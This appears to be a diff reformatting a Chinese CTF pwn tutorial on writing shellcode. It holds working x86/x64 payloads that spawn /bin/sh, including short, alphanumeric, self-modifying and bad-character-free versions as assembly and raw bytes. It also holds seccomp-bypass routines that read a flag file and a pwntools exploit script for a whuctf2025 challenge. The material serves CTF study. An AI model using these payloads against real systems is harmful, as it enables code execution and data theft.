@@ -14,8 +14,7 @@
 ### 直接pwntools生成
 
 
-```
-
+```asm
     /* execve(path='/bin///sh', argv=['sh'], envp=0) */
     /* push b'/bin///sh\x00' */
     push 0x68
@@ -38,7 +37,6 @@
     push SYS_execve /* 0x3b */
     pop rax
     syscall
-
 ```
 
 这里将`/bin/sh`直接压入栈中，然后利用rsp的偏移获取地址，直接生成`shellcraft.sh()`生成即可，不做过多介绍
@@ -47,48 +45,16 @@
 ### 限制长度的shellcode（x86)
 
 
-```
-
-xor
-
-rsi
-,
-rsi
-
-push
-
-rsi
-
-mov
-
-rdi
-,
-
-0x68732f2f6e69622f
-
-push
-
-rdi
-
-push
-
-rsp
-
-pop
-
-rdi
-
-mov
-
-al
-,
-
-59
-
+```asm
+xor rsi,rsi
+push rsi
+mov rdi, 0x68732f2f6e69622f
+push rdi
+push rsp
+pop  rdi
+mov  al, 59
 cdq
-
 syscall
-
 ```
 
 总长度为22（0x16)字节，实现的是`execve('/bin/sh',{'sh'},0)`，构造出来的条件是这样的：
@@ -104,9 +70,7 @@ bytes形式：
 
 
 ```
-
 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
-
 ```
 
 可见字符形式(AE64生成)：
@@ -115,9 +79,7 @@ bytes形式：
 
 
 ```
-
 WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890t8A0T8B0T8CRAPZ0t80ZjBTYfi9O60t810T82RAPZ0T80ZH1vVHwzbinzzshWToxnQZP
-
 ```
 
 **当然，出题人可能会通过一定的构造来要求更小字节的shellcode，主要就是对栈的理解（其实就是考察汇编功底）**
@@ -132,228 +94,62 @@ WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890
 纯字母（这里用的是[V3rdant的shellcode](https://v3rdant.cn/Pwn.Stack-Overflow-Overview/#shellcode%E7%9A%84%E4%B9%A6%E5%86%99)）
 
 
-```
-
+```asm
 // ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129
-
 /* from call rax */
-
-push
-
-rax
-
-push
-
-rax
-
-pop
-
-rcx
+push rax
+push rax
+pop rcx
 
 /* XOR pop rsi, pop rdi, syscall */
-
-push
-
-0x41413030
-
-pop
-
-rax
-
-xor
-
-DWORD
-
-PTR
-
-[
-rcx
-+
-0x30
-],
-
-eax
+push 0x41413030
+pop rax
+xor DWORD PTR [rcx+0x30], eax
 
 /* XOR /bin/sh */
-
-push
-
-0x34303041
-
-pop
-
-rax
-
-xor
-
-DWORD
-
-PTR
-
-[
-rcx
-+
-0x34
-],
-
-eax
-
-push
-
-0x41303041
-
-pop
-
-rax
-
-xor
-
-DWORD
-
-PTR
-
-[
-rcx
-+
-0x38
-],
-
-eax
+push 0x34303041
+pop rax
+xor DWORD PTR [rcx+0x34], eax
+push 0x41303041
+pop rax
+xor DWORD PTR [rcx+0x38], eax
 
 /* rdi = &'/bin/sh' */
-
-push
-
-rcx
-
-pop
-
-rax
-
-xor
-
-al
-,
-
-0x34
-
-push
-
-rax
+push rcx
+pop rax
+xor al, 0x34
+push rax
 
 /* rdx = 0 */
+push 0x30
+pop rax
+xor al, 0x30
+push rax
+pop rdx
 
-push
-
-0x30
-
-pop
-
-rax
-
-xor
-
-al
-,
-
-0x30
-
-push
-
-rax
-
-pop
-
-rdx
-
-push
-
-rax
+push rax
 
 /* rax = 59 (SYS_execve) */
-
-push
-
-0x41
-
-pop
-
-rax
-
-xor
-
-al
-,
-
-0x7a
+push 0x41
+pop rax
+xor al, 0x7a
 
 /* pop rsi, pop rdi*/
-
-/* syscall */
-
-
-.
-byte
-
-0x6e
-
-.
-byte
-
-0x6f
-
-.
-byte
-
-0x4e
-
-.
-byte
-
-0x44
+/* syscall */ 
+.byte 0x6e
+.byte 0x6f
+.byte 0x4e
+.byte 0x44
 
 /* /bin/sh */
-
-.
-byte
-
-0x6e
-
-.
-byte
-
-0x52
-
-.
-byte
-
-0x59
-
-.
-byte
-
-0x5a
-
-.
-byte
-
-0x6e
-
-.
-byte
-
-0x43
-
-.
-byte
-
-0x5a
-
-.
-byte
-
-0x41
-
+.byte 0x6e
+.byte 0x52
+.byte 0x59
+.byte 0x5a
+.byte 0x6e
+.byte 0x43
+.byte 0x5a
+.byte 0x41
 ```
 
 这一段shellcode可以绕过`\x05\x0f`的过滤，但是注意这里需要由`call rax`启动
@@ -361,313 +157,36 @@ byte
 **自改变shellcode**（这里用的whuctf2025中shell\_for\_shell）
 
 
-```
-
-mov
-
-si
-,
-
-word
-
-ptr
-
-[
-r15
-
-+
-
-0x100
-]
-
-;
-r15的值
-+
-0x100
-，
-赋给si
-（
-rsi
-，
-16
-位模式
-)
-
-
-add
-
-si
-,
-
-0x101
-
-;
-再将si加上0x101
-
-
-mov
-
-word
-
-ptr
-
-[
-r15
-
-+
-
-0x100
-],
-
-si
-
-;
-修改后的si存给r15
-+
-0x100
-的内存位置
-
-
-/*这里是为了给后面syscall找个确定位置，顺便自加一*/
-
-
-push
-
-0x68
-
-;
-压入
-"h"
-
-
-mov
-
-rax
-,
-
-0x732f2f2f6e69622f
-
-;
-压入
-/
-bin
-///s到rax中
-
-
-push
-
-rax
-
-;
-压入rax中的值
-
-
-mov
-
-rdi
-,
-
-rsp
-
-;
-栈顶指针给rdi
-，
-作为路径字符串的地址
-，
-后面直接写入execve
-
-
-push
-
-0x1010101
-
-^
-
-0x6873
-
-;
-异或的值压栈
-，
-避免显式空字节
-
-
-xor
-
-dword
-
-ptr
-
-[
-rsp
-],
-
-0x1010101
-
-;
-异或解密栈顶4字节
-，
-得到
-'
-sh
-\
-x00
-'
-
-
-xor
-
-esi
-,
-
-esi
-
-/* 0 */
-
-
-push
-
-rsi
-
-;
-作为字符串的
-\
-x00
-
-
-push
-
-8
-
-;
-压入8
-，
-后面计算
-‘
-sh
-\
-x00
-'
-字符串地址用
-
-
-pop
-
-rsi
-
-;
-将8弹给rsi
-
-
-add
-
-rsi
-,
-
-rsp
-
-;
-rsi
-=
-8
-+
-rsp
-，
-指向
-'
-sh
-\
-x00
-'
-
-
-push
-
-rsi
-
-;
-压入sh
-\
-x00
-
-
-mov
-
-rsi
-,
-
-rsp
-
-
-xor
-
-edx
-,
-
-edx
-
-/* 0 */
-
-
-/* call execve() */
-
-
-push
-
-SYS_execve
-
-;
-等价于push
-
-0x3b
-
-
-pop
-
-rax
-
-;
-弹给rax
-
+```asm
+    mov si, word ptr [r15 + 0x100]  ;r15的值+0x100，赋给si（rsi，16位模式)
+    add si, 0x101                   ;再将si加上0x101
+    mov word ptr [r15 + 0x100], si  ;修改后的si存给r15+0x100的内存位置
+    /*这里是为了给后面syscall找个确定位置，顺便自加一*/
+    push 0x68                       ;压入"h"
+    mov rax, 0x732f2f2f6e69622f     ;压入/bin///s到rax中
+    push rax                        ;压入rax中的值
+    mov rdi, rsp                    ;栈顶指针给rdi，作为路径字符串的地址，后面直接写入execve
+
+    push 0x1010101 ^ 0x6873         ;异或的值压栈，避免显式空字节
+    xor dword ptr [rsp], 0x1010101  ;异或解密栈顶4字节，得到'sh\x00'
+    xor esi, esi /* 0 */
+    push rsi                        ;作为字符串的\x00
+    push 8                          ;压入8，后面计算‘sh\x00'字符串地址用
+    pop rsi                         ;将8弹给rsi
+    add rsi, rsp                    ;rsi=8+rsp，指向'sh\x00'
+    push rsi                        ;压入sh\x00
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve                 ;等价于push 0x3b
+    pop rax                         ;弹给rax
 ```
 
 注入时
 
 
 ```
-
-payload
-
-=
-
-(
-b
-"
-\x00\xc0
-"
-+
-asm
-(
-shellcode
-))
-.
-ljust
-(
-0x100
--
-3
-,
-
-b
-"
-\x90
-"
-)
-+
-b
-"
-\x0e\x04
-"
-
+payload = (b"\x00\xc0"+asm(shellcode)).ljust(0x100-3, b"\x90")+b"\x0e\x04"
 ```
 
 详细解释见[这里的自改变shellcode](https://github.com/maple-pwn/for_fresher/blob/main/pwn/wp/whuctf2025/wp.md)
@@ -683,63 +202,11 @@ pwntool里有自己的orw生成，但是字节比较长，一般情况下都不�
 
 
 ```
-
-bss
-
-=
-
-0x804A060
-
-shellcode
-
-=
-
-shellcraft
-.
-open
-(
-'flag'
-)
-
-shellcode
-+=
-shellcraft
-.
-read
-(
-'eax'
-,
-bss
-+
-100
-,
-100
-)
-
-shellcode
-+=
-shellcraft
-.
-write
-(
-1
-,
-bss
-+
-100
-,
-100
-)
-
-payload
-
-=
-
-asm
-(
-shellcode
-)
-
+bss = 0x804A060
+shellcode = shellcraft.open('flag')
+shellcode+=shellcraft.read('eax',bss+100,100)
+shellcode+=shellcraft.write(1,bss+100,100)
+payload = asm(shellcode)
 ```
 
 长度为0x36字节
@@ -753,147 +220,49 @@ shellcode
 - 不可指定地址
 
 
-```
-
+```asm
 // rdx为写入数量
-
-mov
-
-rdx
-,
-
-0x200
-
-push
-
-0x67616c66
-
-mov
-
-rdi
-,
-rsp
-
-xor
-
-esi
-,
-esi
-
-
-#
-如果本来rsi
-=
-0
-，
-可以删掉这句
-
-mov
-
-eax
-,
-2
-
+mov rdx, 0x200
+push 0x67616c66
+mov rdi,rsp
+xor esi,esi  #如果本来rsi=0，可以删掉这句
+mov eax,2
 syscall
-
-mov
-
-edi
-,
-eax
-
-mov
-
-rsi
-,
-rsp
-
-xor
-
-eax
-,
-eax
-
+mov edi,eax
+mov rsi,rsp
+xor eax,eax
 syscall
-
-xor
-
-edi
-,
-2
-
-
-mov
-
-eax
-,
-edi
-
-syscall
-
-
+xor edi,2  
+mov eax,edi
+syscall  
 ```
 
 bytes:
 
 
 ```
-
 \x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05
-
 ```
 
 **可指定地址**
 
 
-```
-
-shellcode
-
-=
-
-"""
-
+```asm
+shellcode = """
 xor rdx,rdx
-
 mov dh, 0x2
-
-mov rdi,
-{}
-
-xor esi,esi
-
+mov rdi,{}
+xor esi,esi  
 mov eax,2
-
 syscall
-
 mov rsi,rdi
-
 mov edi,eax
-
 xor eax,eax
-
 syscall
-
 xor edi,2
-
 mov eax,edi
-
 syscall
-
-"""
-.
-format
-(
-hex
-(
-target_addr
-
-+
-
-0xb0
-))
-
+""".format(hex(target_addr + 0xb0))
 ```
 
 长度比0x90大
@@ -911,36 +280,13 @@ target_addr
 但是可以发现我们写入的指令最后被rdi指向，所以可以构造出合适的短shellcode
 
 
-```
-
-shellcode
-
-=
-
-asm
-(
-'''
-
+```asm
+shellcode = asm('''
 mov rdi,0xa
-
 add rax,0x3b
-
 syscall
-
-'''
-)
-
-payload
-
-=
-
-shellcode
-+
-b
-'/bin/sh
-\x00
-'
-
+''')
+payload = shellcode+b'/bin/sh\x00'
 ```
 
 
@@ -981,135 +327,51 @@ b
 依旧用whuctf2025的shell\_for\_shell举例，这里可见powchan的exp:
 
 
-```
-
-shellcode
-
-=
-
-"""
-
+```asm
+shellcode = """
     mov rbp, 0x404500
-
     mov rsp, rbp
-
     lea r15, [rip+0xe00]
-
     sub r15, 0xe16
-
     mov rdi, r15
-
     mov rsi, 0x1000
-
     mov rdx, 0x7
-
     mov rax, 0x401070
-
     call rax
-
     mov rsi, r15
-
     add rsi, 0x86
-
     mov rdi, 0
-
     mov rdx, 0x100
-
     mov rax, 0x401050
-
     call rax
-
     /* push syscall number */
-
     push 0x68
-
     mov rax, 0x732f2f2f6e69622f
-
     push rax
-
     mov rdi, rsp
-
-    /* push argument array ['sh
-\x00
-'] */
-
-    /* push b'sh
-\x00
-' */
-
+    /* push argument array ['sh\x00'] */
+    /* push b'sh\x00' */
     push 0x1010101 ^ 0x6873
-
     xor dword ptr [rsp], 0x1010101
-
     xor esi, esi /* 0 */
-
     push rsi /* null terminate */
-
     push 8
-
     pop rsi
-
     add rsi, rsp
-
-    push rsi /* 'sh
-\x00
-' */
-
+    push rsi /* 'sh\x00' */
     mov rsi, rsp
-
     xor edx, edx /* 0 */
-
     /* call execve() */
-
     push SYS_execve /* 0x3b */
-
     pop rax
 
 """
-
-payload
-
-=
-
-b
-"
-\x00\xc0
-"
-+
-asm
-(
-shellcode
-)
-
-print
-(
-payload
-)
-
-io
-.
-send
-(
-payload
-)
-
-pause
-()
-
-io
-.
-send
-(
-asm
-(
-"syscall"
-))
-
-io
-.
-interactive
-()
-
+payload = b"\x00\xc0"+asm(shellcode)
+print(payload)
+io.send(payload)
+pause()
+io.send(asm("syscall"))
+io.interactive()
 ```
 
 **坏字符**
@@ -1119,116 +381,40 @@ interactive
 注意，这里的坏字符过滤可能是“”无心“”过滤掉的，例如strcpy遇见‘\x00’就结束了，所以我们需要特定的shellcode
 
 
-```
-
-xor
-
-ecx
-,
-
-ecx
-
-mul
-
-ecx
-
-push
-
-ecx
-
-push
-
-0x68732f2f
-
-push
-
-0x6e69622f
-
-mov
-
-ebx
-,
-
-esp
-
-mov
-
-al
-,
-
-11
-
-int
-
-0x80
-
+```asm
+xor ecx, ecx
+mul ecx
+push ecx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+mov al, 11
+int 0x80
 ```
 
 
-```
-
-xor
-
-rsi
-,
-
-rsi
-
-push
-
-rsi
-
-mov
-
-rdi
-,
-
-0x68732f2f6e69622f
-
-push
-
-rdi
-
-push
-
-rsp
-
-pop
-
-rdi
-
-mov
-
-al
-,
-
-0x3b
-
-cdq
-
-
+```asm
+xor    rsi, rsi
+push   rsi
+mov    rdi, 0x68732f2f6e69622f
+push   rdi
+push   rsp
+pop    rdi
+mov    al, 0x3b
+cdq    
 syscall
-
 ```
 
 共22字节数（其实和上面最短shellcode一样的）
 
 
 ```
-
-b
-"
-\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
-"
-
+b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
 ```
 
 
 ```
-
-b
-"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
-
+b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
 ```
 
 
@@ -1276,543 +462,115 @@ b
 #### level1 开放open,read,write
 
 
-```
-
-push
-
-0x67616c66
-
-mov
-
-rdi
-,
-
-rsp
-
-xor
-
-esi
-,
-
-esi
-
-push
-
-0x2
-
-pop
-
-rax
-
+```asm
+push   0x67616c66
+mov    rdi, rsp
+xor    esi, esi
+push   0x2
+pop    rax
+syscall 
+mov    rdi, rax
+mov    rsi, rsp
+mov    edx, 0x100
+xor    eax, eax
+syscall 
+mov    edi, 0x1
+mov    rsi, rsp
+push   0x1
+pop    rax
 syscall
-
-
-mov
-
-rdi
-,
-
-rax
-
-mov
-
-rsi
-,
-
-rsp
-
-mov
-
-edx
-,
-
-0x100
-
-xor
-
-eax
-,
-
-eax
-
-syscall
-
-
-mov
-
-edi
-,
-
-0x1
-
-mov
-
-rsi
-,
-
-rsp
-
-push
-
-0x1
-
-pop
-
-rax
-
-syscall
-
 ```
 
 
 #### level2 关闭open
 
 
-```
-
-mov
-
-rax
-,
-0x0067616c662f
-
-push
-
-rax
-
-mov
-
-rsi
-,
-rsp
-
-xor
-
-rdx
-,
-rdx
-
-mov
-
-rax
-,
-257
-
+```asm
+mov rax,0x0067616c662f
+push rax
+mov rsi,rsp
+xor rdx,rdx
+mov rax,257
 syscall
-
-xor
-
-rdi
-,
-rdi
-
-inc
-
-rdi
-
-mov
-
-rsi
-,
-rax
-
-xor
-
-rdx
-,
-rdx
-
-mov
-
-r10
-,
-0x100
-
-
-#
-
-读取文件的长度
-,
-不够就加
-
-mov
-
-rax
-,
-40
-
+xor rdi,rdi
+inc rdi
+mov rsi,rax
+xor rdx,rdx
+mov r10,0x100 # 读取文件的长度,不够就加
+mov rax,40
 syscall
-
 ```
 
 
 ```
-
-b
-'H
-\xb8
-/flag
-\x00\x00\x00
-PH
-\x89\xe6
-H1
-\xd2
-H
-\xc7\xc0\x01\x01\x00\x00\x0f\x05
-H1
-\xff
-H
-\xff\xc7
-H
-\x89\xc6
-H1
-\xd2
-I
-\xc7\xc2\x00\x01\x00\x00
-H
-\xc7\xc0
-(
-\x00\x00\x00\x0f\x05
-'
-
+b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05'
 ```
 
 
 #### level3 openat readv writev
 
 
-```
-
-mov
-
-rax
-,
-0x0067616c662f
-
-push
-
-rax
-
-mov
-
-rsi
-,
-rsp
-
-xor
-
-rdx
-,
-rdx
-
-mov
-
-rax
-,
-257
-
+```asm
+mov rax,0x0067616c662f
+push rax
+mov rsi,rsp
+xor rdx,rdx
+mov rax,257
 syscall
-
-mov
-
-rdi
-,
-rax
-
-push
-
-0x100
-
-
-#
-
-读入大小由这个控制
-
-mov
-
-rbx
-,
-rsp
-
-sub
-
-rbx
-,
-0x108
-
-
-#
-
-为读入大小加8
-
-push
-
-rbx
-
-mov
-
-rsi
-,
-rsp
-
-mov
-
-rdx
-,
-1
-
-mov
-
-rax
-,
-19
-
+mov rdi,rax
+push 0x100 # 读入大小由这个控制
+mov rbx,rsp
+sub rbx,0x108 # 为读入大小加8
+push rbx
+mov rsi,rsp
+mov rdx,1
+mov rax,19
 syscall
-
-mov
-
-rdi
-,
-1
-
-mov
-
-rsi
-,
-rsp
-
-mov
-
-rdx
-,
-1
-
-mov
-
-rax
-,
-20
-
+mov rdi,1
+mov rsi,rsp
+mov rdx,1
+mov rax,20
 syscall
-
 ```
 
 
 ```
-
-b
-'H
-\xb8
-/flag
-\x00\x00\x00
-PH
-\x89\xe6
-H1
-\xd2
-H
-\xc7\xc0\x01\x01\x00\x00\x0f\x05
-H
-\x89\xc7
-h
-\x00\x01\x00\x00
-H
-\x89\xe3
-H
-\x81\xeb\x08\x01\x00\x00
-SH
-\x89\xe6
-H
-\xc7\xc2\x01\x00\x00\x00
-H
-\xc7\xc0\x13\x00\x00\x00\x0f\x05
-H
-\xc7\xc7\x01\x00\x00\x00
-H
-\x89\xe6
-H
-\xc7\xc2\x01\x00\x00\x00
-H
-\xc7\xc0\x14\x00\x00\x00\x0f\x05
-'
-
+b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H\x89\xc7h\x00\x01\x00\x00H\x89\xe3H\x81\xeb\x08\x01\x00\x00SH\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x13\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x14\x00\x00\x00\x0f\x05'
 ```
 
 
 #### level3.5 openat2 read write
 
 
-```
-
-mov
-
-rax
-,
-
-0x67616c66
-
-
-#
-
-路径
-
-push
-
-rax
-
-xor
-
-rdi
-,
-
-rdi
-
-sub
-
-rdi
-,
-
-100
-
-mov
-
-rsi
-,
-
-rsp
-
-push
-
-0
-
-push
-
-0
-
-push
-
-0
-
-mov
-
-rdx
-,
-
-rsp
-
-mov
-
-r10
-,
-
-0x18
-
-push
-
-SYS_openat2
-
-
-#
-
-pwntools预定义的系统调用号
-,
-也可以手动查
-
-pop
-
-rax
-
+```asm
+mov rax, 0x67616c66 # 路径
+push rax
+xor rdi, rdi
+sub rdi, 100
+mov rsi, rsp
+push 0
+push 0
+push 0
+mov rdx, rsp
+mov r10, 0x18
+push SYS_openat2 # pwntools预定义的系统调用号,也可以手动查
+pop rax
 syscall
-
-mov
-
-rdi
-,
-rax
-
-mov
-
-rsi
-,
-rsp
-
-mov
-
-edx
-,
-0x100
-
-xor
-
-eax
-,
-eax
-
+mov rdi,rax
+mov rsi,rsp
+mov edx,0x100
+xor eax,eax
 syscall
-
-mov
-
-edi
-,
-1
-
-mov
-
-rsi
-,
-rsp
-
-push
-
-1
-
-pop
-
-rax
-
+mov edi,1
+mov rsi,rsp
+push 1
+pop rax
 syscall
-
 ```
 
 
 ```
-
-b
-'H
-\xc7\xc0
-flagPH1
-\xff
-H
-\x83\xef
-dH
-\x89\xe6
-j
-\x00
-j
-\x00
-j
-\x00
-H
-\x89\xe2
-I
-\xc7\xc2\x18\x00\x00\x00
-h
-\xb5\x01\x00\x00
-X
-\x0f\x05
-H
-\x89\xc7
-H
-\x89\xe6\xba\x00\x01\x00\x00
-1
-\xc0\x0f\x05\xbf\x01\x00\x00\x00
-H
-\x89\xe6
-j
-\x01
-X
-\x0f\x05
-'
-
+b'H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05'
 ```
 
 
